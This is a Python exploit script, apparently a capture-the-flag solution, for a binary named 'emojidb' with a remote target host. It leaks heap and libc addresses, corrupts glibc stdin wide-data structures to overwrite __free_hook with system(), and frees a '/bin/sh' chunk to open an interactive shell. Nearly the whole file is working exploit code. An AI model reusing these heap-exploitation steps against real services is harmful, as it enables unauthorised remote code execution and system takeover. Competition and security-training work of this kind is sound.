#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from sc_expwn import *  # https://raw.githubusercontent.com/shift-crops/sc_expwn/master/sc_expwn.py

bin_file = './emojidb'
context(os = 'linux', arch = 'amd64')
# context.log_level = 'debug'

#==========

env = Environment('debug', 'local', 'remote')
env.set_item('mode',    debug = 'DEBUG', local = 'PROC', remote = 'SOCKET')
env.set_item('target',  debug   = {'argv':[bin_file], 'aslr':True, 'gdbscript':'c'}, \
                        local   = {'argv':['bash', '-c', 'exec {} 2>&-'.format(bin_file)]}, \
                        remote  = {'host':'emojidb.pwni.ng', 'port':9876})
env.select()

#==========

binf = ELF(bin_file)

libc = binf.libc
offset_libc_malloc_hook = libc.symbols['__malloc_hook']
offset_libc_mainarena   = offset_libc_malloc_hook + 0x10

#==========

def attack(conn, **kwargs):
    edb = EmojiDB(conn)
    enc = Encode(kwargs['enc'].connection)

    edb.new(0x410, 'a\n')   # 1
    edb.new(0x18, 'x\n')    # 2
    edb.new(0x410, 'b\n')   # 3
    edb.new(0x18, 'y\n')    # 4

    edb.free(3)
    edb.free(1)

    leak = edb.open(1)
    if b'?' in leak:
        raise

    addr = enc.utf2uni(leak)
    addr_heap_base = u64(addr[:8]) - 0x1910
    info('addr_heap_base    = 0x{:08x}'.format(addr_heap_base))

    addr_libc_mainarena = u64(addr[8:0x10]) - 0x60
    libc.address = addr_libc_mainarena - offset_libc_mainarena
    info('addr_libc_base    = 0x{:08x}'.format(libc.address))
    addr_libc_stdin         = libc.symbols['_IO_2_1_stdin_']
    addr_libc_wide_data_1   = addr_libc_stdin - 0x138
    addr_libc_wide_data_2   = addr_libc_wide_data_1 - 0x138
    addr_libc_free_hook     = libc.symbols['__free_hook']
    addr_libc_system        = libc.sep_function['system']

    edb.new(0x18, enc.uni2utf(p64(addr_libc_free_hook)) + b'\n')    # 1
    edb.new(0x18, enc.uni2utf(b'/bin/sh') + b'\n')                  # 3
    edb.new(0x18, 'X\n')                                            # 5

    conn.send(enc.uni2utf(p32(0x11223344))*0xc)
    overwrite  = enc.uni2utf(p32((addr_libc_wide_data_1 + 0x128) & ((1<<32)-1)))
    overwrite += enc.uni2utf(p32((addr_libc_wide_data_1 + 0x128) >> 32))
    conn.send(overwrite)

    buf_base  = enc.uni2utf(p32(((addr_libc_wide_data_2+0x20) - 0xf0) & ((1<<32)-1)))
    buf_base += enc.uni2utf(p32(((addr_libc_wide_data_2+0x20) - 0xf0) >> 32))
    buf_end   = enc.uni2utf(p32(((addr_libc_wide_data_2+0x20) + 0x10) & ((1<<32)-1)))
    buf_end  += enc.uni2utf(p32(((addr_libc_wide_data_2+0x20) + 0x10) >> 32))
    conn.send((buf_base + buf_end)*2)

    conn.send('📖1')
    conn.send(enc.uni2utf(p64(addr_libc_system)))
    edb.free(3)

class EmojiDB:
    def __init__(self, conn):
        self.recvuntil      = conn.recvuntil
        self.recv           = conn.recv
        self.sendline       = conn.sendline
        self.send           = conn.send
        self.sendlineafter  = conn.sendlineafter
        self.sendafter      = conn.sendafter

    def new(self, size, data):
        self.sendlineafter('❓', '🆕')
        self.sendafter('❓', str(int(size/4)))
        self.send(data)

    def open(self, idx):
        self.sendlineafter('❓', '📖')
        self.sendlineafter('❓', str(idx))
        return self.recvuntil('🆕📖🆓🛑❓😱', drop=True)

    def free(self, idx):
        self.sendlineafter('❓', '🆓')
        self.sendlineafter('❓', str(idx))
        self.recvuntil('😱')

    def exit(self):
        self.sendlineafter('❓', '🛑')

class Encode:
    def __init__(self, conn):
        self.recvuntil      = conn.recvuntil
        self.recv           = conn.recv
        self.sendline       = conn.sendline
        self.send           = conn.send
        self.sendlineafter  = conn.sendlineafter
        self.sendafter      = conn.sendafter

    def utf2uni(self, utfstr):
        self.sendafter('> ', chr(1))
        self.sendline(utfstr)
        return self.recvuntil('Done', drop=True)

    def uni2utf(self, unistr):
        self.sendafter('> ', chr(2))
        self.send(unistr)
        return self.recvuntil('Done', drop=True)

#==========

def main():
    enc = Communicate('PROC', argv=['./encode'])
    enc.connect()

    comn = Communicate(env.mode, **env.target)
    comn.connect()
    comn.bruteforce(attack, enc=enc)
    comn.interactive()

if __name__=='__main__':
    main()

#==========
